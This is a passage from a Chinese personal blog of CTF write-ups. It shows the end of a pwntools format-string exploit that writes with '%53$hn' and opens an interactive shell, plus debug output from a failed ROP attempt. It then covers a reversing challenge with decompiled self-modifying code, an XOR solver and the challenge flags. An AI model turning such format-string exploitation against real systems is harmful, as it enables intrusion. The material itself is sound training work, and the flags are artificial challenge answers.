class="string">"c"</span>+<span class="string">"%53$hn"</span></span><br><span class="line">r.sendline(pay)</span><br><span class="line">r.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="built_in">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
<p>得到flag：<code>flag{c6671fc0-××××-42ef-8af0-c20c65f854be}</code></p>
<p>还有一点就是我不知道为什么用ROP不行，得不到shell，说什么<code>not found</code><br><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">[DEBUG] Received 0x17 bytes:</span><br><span class="line">   <span class="number"> 00000000 </span><span class="number"> 73 </span>68 3a<span class="number"> 20 </span><span class="number"> 31 </span>3a<span class="number"> 20 </span>62  d4 d1 ff 3a <span class="number"> 20 </span>6e 6f<span class="number"> 74 </span> │sh: │1: b│···:│ not│</span><br><span class="line">   <span class="number"> 00000010 </span><span class="number"> 20 </span>66 6f<span class="number"> 75 </span> 6e<span class="number"> 64 </span>0a                               │ fou│nd·│</span><br><span class="line">    00000017</span><br><span class="line">sh: 1: b��\xff: not found</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
<h3 id="达芬奇密码"><a href="#达芬奇密码" class="headerlink" title="达芬奇密码"></a>达芬奇密码</h3><p>32位windows上的程序，拖到IDA找到关键代码，发现没有关键字符串，推断出，字符串是程序开始时转变过来的，动态调试分析找到关键代码/函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">thiscall <span class="title">sub_401EA0</span><span class="params">(CWnd *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v1 = <span class="keyword">this</span>;</span><br><span class="line">  v9 = <span class="keyword">this</span>;</span><br><span class="line">  String = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v5, <span class="number">0</span>, <span class="number">0x1FE</span>u);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v7, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">  CWnd::GetDlgItemTextW(v1, <span class="number">1000</span>, &amp;String, <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">if</span> ( wcslen(&amp;String) == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( !(*(&amp;String + v2) &amp; <span class="number">0xFF00</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;v6 + v2) = *((_BYTE *)&amp;String + <span class="number">2</span> * v2);</span><br><span class="line">      <span class="keyword">if</span> ( ++v2 &gt;= <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = <span class="number">64</span>;</span><br><span class="line">        flOldProtect = <span class="number">0</span>;</span><br><span class="line">        VirtualProtect(sub_4010E0, <span class="number">0xD17</span>u, <span class="number">0x40</span>u, &amp;flOldProtect);</span><br><span class="line">        <span class="keyword">if</span> ( GetLastError() )</span><br><span class="line">          <span class="keyword">return</span> CWnd::MessageBoxW(v1, <span class="string">L"Wrong!"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        qmemcpy(sub_4010E0, &amp;byte_5647B8, <span class="number">0x330</span>u);</span><br><span class="line">        VirtualProtect(sub_4010E0, <span class="number">0xD17</span>u, flOldProtect, &amp;v8);</span><br><span class="line">        <span class="keyword">if</span> ( !GetLastError() )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = <span class="number">0</span>;</span><br><span class="line">          v10 = sub_4010E0();</span><br><span class="line">          <span class="keyword">if</span> ( v10 == <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">return</span> CWnd::MessageBoxW(v9, <span class="string">L"Congratulations! You are right!"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v1 = v9;</span><br><span class="line">        <span class="keyword">return</span> CWnd::MessageBoxW(v1, <span class="string">L"Wrong!"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> CWnd::MessageBoxW(v1, <span class="string">L"Wrong!"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过分析代码发现，正确的关键是<code>sub_4010E0</code>返回1，但是程序利用qmemcpy来动态修改了<code>sub_4010E0</code>函数，我用OD把修改过的程序dump下来，打开<code>sub_4010E0</code>函数：</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">signed<span class="built_in"> int </span>__cdecl sub_4010E0(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  v31 = 1684969601;</span><br><span class="line">  v1 = 0;</span><br><span class="line">  v30 = -477325802;</span><br><span class="line">  v32 = 0x81DC0884;</span><br><span class="line">  v33 = 1330138558;</span><br><span class="line">  v34 = 0;</span><br><span class="line">  v35 = 0;</span><br><span class="line">  v36 = 0;</span><br><span class="line">  v37 = 0;</span><br><span class="line">  v38 = 0;</span><br><span class="line">  v39 = 0;</span><br><span class="line">  v44 = 0;</span><br><span class="line">  v45 = 0;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *(&amp;v32 + v1) ^ *(a1 + v1 + 8);</span><br><span class="line">    *(&amp;v38 + v1) = *(&amp;v30 + v1) ^ *(&amp;v30 + v1 + a1 - &amp;v30);</span><br><span class="line">    *(&amp;v44 + v1++) = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v1 &lt; 8 );</span><br><span class="line">  v30 = 0;</span><br><span class="line">  v56 = 0;</span><br><span class="line">  v57 = 0;</span><br><span class="line">  v58 = 0;</span><br><span class="line">  v59 = 0;</span><br><span class="line">  v60 = 0;</span><br><span class="line">  v61 = 0;</span><br><span class="line">  v62 = 0;</span><br><span class="line">  v63 = 0;</span><br><span class="line">  v64 = 0;</span><br><span class="line">  v65 = 0;</span><br><span class="line">  v46 = 0;</span><br><span class="line">  v47 = 0;</span><br><span class="line">  v48 = 0;</span><br><span class="line">  v49 = 0;</span><br><span class="line">  v50 = 0;</span><br><span class="line">  v51 = 0;</span><br><span class="line">  v52 = 0;</span><br><span class="line">  v53 = 0;</span><br><span class="line">  v54 = 0;</span><br><span class="line">  v55 = 0;</span><br><span class="line">  v31 = 0;</span><br><span class="line">  v32 = 0;</span><br><span class="line">  v33 = 0;</span><br><span class="line">  LOBYTE(v34) = 0;</span><br><span class="line">  v3 = 8;</span><br><span class="line">  LOBYTE(v30) = 8;</span><br><span class="line">  v4 = 7;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in"> if </span>( *(&amp;v38 + v4) )</span><br><span class="line">      break;</span><br><span class="line">    --v3;</span><br><span class="line">    --v4;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v4 &gt;= 0 );</span><br><span class="line"> <span class="built_in"> if </span>( v3 == 8 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = 7;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="built_in"> if </span>( *(&amp;v44 + v5) )</span><br><span class="line">        break;</span><br><span class="line">      --v3;</span><br><span class="line">      --v5;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v5 &gt;= 0 );</span><br><span class="line">   <span class="built_in"> if </span>( v3 == 8 &amp;&amp; !(v39 &amp; 0xF0000000) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = 0;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        v40 = 0;</span><br><span class="line">        v41 = 0;</span><br><span class="line">        v42 = 0;</span><br><span class="line">        v43 = 0;</span><br><span class="line">        v7 = 0;</span><br><span class="line">        v8 = *(&amp;v38 + v6);</span><br><span class="line">        v9 = &amp;v40 + v6;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = *(&amp;v42 + v6) + v8 * *(&amp;v38 + v7);</span><br><span class="line">          v9[v7] = *(&amp;v42 + v6) + v8 * *(&amp;v38 + v7);</span><br><span class="line">          ++v7;</span><br><span class="line">          *(&amp;v42 + v6) = HIBYTE(v10);</span><br><span class="line">        &#125;</span><br><span class="line">        while ( v7 &lt; 8 );</span><br><span class="line">        LOBYTE(v11) = 0;</span><br><span class="line">        v12 = 0;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = v11 + *(&amp;v56 + v12 + v6) + v9[v12];</span><br><span class="line">          *(&amp;v56 + v12++ + v6) = v13;</span><br><span class="line">          v11 = v13 &gt;&gt; 8;</span><br><span class="line">        &#125;</span><br><span class="line">        while ( v12 &lt; 9 );</span><br><span class="line">        ++v6;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v6 &lt; 8 );</span><br><span class="line">      v14 = 0;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        v40 = 0;</span><br><span class="line">        v41 = 0;</span><br><span class="line">        v42 = 0;</span><br><span class="line">        v43 = 0;</span><br><span class="line">        v15 = 0;</span><br><span class="line">        v16 = *(&amp;v44 + v14);</span><br><span class="line">        v17 = &amp;v40 + v14;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">          v18 = *(&amp;v42 + v14) + v16 * *(&amp;v44 + v15);</span><br><span class="line">          v17[v15] = *(&amp;v42 + v14) + v16 * *(&amp;v44 + v15);</span><br><span class="line">          ++v15;</span><br><span class="line">          *(&amp;v42 + v14) = HIBYTE(v18);</span><br><span class="line">        &#125;</span><br><span class="line">        while ( v15 &lt; 8 );</span><br><span class="line">        LOBYTE(v19) = 0;</span><br><span class="line">        v20 = 0;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">          v21 = v19 + *(&amp;v61 + v20 + v14) + v17[v20];</span><br><span class="line">          *(&amp;v61 + v20++ + v14) = v21;</span><br><span class="line">          v19 = v21 &gt;&gt; 8;</span><br><span class="line">        &#125;</span><br><span class="line">        while ( v20 &lt; 9 );</span><br><span class="line">        ++v14;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v14 &lt; 8 );</span><br><span class="line">      LOBYTE(v22) = v50;</span><br><span class="line">      v23 = 0;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        v24 = v22 + 7 * *(&amp;v61 + v23);</span><br><span class="line">        *(&amp;v46 + v23++) = v24;</span><br><span class="line">        v22 = v24 &gt;&gt; 8;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v23 &lt; 17 );</span><br><span class="line">      v50 = HIBYTE(v24);</span><br><span class="line">      v25 = 0;</span><br><span class="line">      v26 = 0;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        v27 = *(&amp;v56 + v26) - *(&amp;v46 + v26) - v25;</span><br><span class="line">        *(&amp;v51 + v26) = v27;</span><br><span class="line">       <span class="built_in"> if </span>( v27 &lt; 0 )</span><br><span class="line">          v25 = 1;</span><br><span class="line">        ++v26;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v26 &lt; 17 );</span><br><span class="line">     <span class="built_in"> if </span>( !v25 )</span><br><span class="line">      &#123;</span><br><span class="line">        v28 = 0;</span><br><span class="line">        while ( *(&amp;v51 + v28) == *(&amp;v30 + v28) )</span><br><span class="line">        &#123;</span><br><span class="line">         <span class="built_in"> if </span>( ++v28 &gt;= 17 )</span><br><span class="line">           <span class="built_in"> return </span>1;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="built_in"> return </span>0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经过分析后发现这个函数是一个二元二次方程：x<em>x-7</em>y*y==8</p>
<p>算法可能是讲乘法用传统的计算方法给实现的，就是手算的过程（个人猜测）</p>
<p>然后就是解这个方程，网上人说用<a href="https://www.wolframalpha.com" target="_blank" rel="noopener">wolframalpha</a>来求解，我没能试出来</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">蹭一个答案吧</span><br><span class="line"></span><br><span class="line">data = [<span class="number">0x5a</span>,<span class="number">0xa5</span>,<span class="number">0xe1</span>,<span class="number">0xb9</span>,<span class="number">0xb3</span>,<span class="number">0xf3</span>,<span class="number">0x57</span>,<span class="number">0x05</span>,<span class="number">0xde</span>,<span class="number">0x38</span>,<span class="number">0xbd</span>,<span class="number">0xb2</span>,<span class="number">0x88</span>,<span class="number">0x09</span>,<span class="number">0x05</span>,<span class="number">0x02</span>]</span><br><span class="line">data1 = [<span class="number">0x16</span>,<span class="number">0x96</span>,<span class="number">0x8C</span>,<span class="number">0xE3</span>,<span class="number">0x81</span>,<span class="number">0x98</span>,<span class="number">0x6E</span>,<span class="number">0x64</span>,<span class="number">0x84</span>,<span class="number">0x08</span>,<span class="number">0xDC</span>,<span class="number">0x81</span>,<span class="number">0xBE</span>,<span class="number">0x4D</span>,<span class="number">0x48</span>,<span class="number">0x4F</span>]</span><br><span class="line">for x <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    print chr(data[x]^data1[x]),</span><br></pre></td></tr></table></figure>
<p><code>sub_4010E0</code>函数首先用程序中已知的数据和输入进行异或，所以我们最后应该再异或</p>
<p>flag：L3mZ2k9aZ0a36DMM</p>

        
        <br>
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
        本站总访问量<span id="busuanzi_value_site_pv"></span>次
       </p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
